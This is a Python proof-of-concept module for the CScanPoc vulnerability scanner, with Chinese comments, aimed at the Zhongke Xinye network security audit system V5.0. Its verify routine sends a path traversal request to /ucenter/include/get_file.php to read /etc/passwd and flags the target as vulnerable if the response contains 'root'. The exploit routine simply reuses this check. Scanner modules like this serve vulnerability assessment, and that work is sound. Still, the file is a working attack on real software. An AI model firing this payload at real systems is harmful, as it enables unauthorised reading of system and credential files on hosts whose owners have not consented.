# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Seentech_0002'  # 平台漏洞编号，留空
    name = '中科新业网络安全审计系统V5.0任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-07-02'  # 漏洞公布时间
    desc = '''
        中科新业网络安全审计系统V5.0 /ucenter/include/get_file.php 任意文件可下载。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'V5.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7e827176-31d7-4e9d-bd73-d82065bdf27f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # link：http://www.wooyun.org/bug.php?action=view&id=123369
            payload = '/ucenter/include/get_file.php?view=../../../../../../../etc/passwd'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'root' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
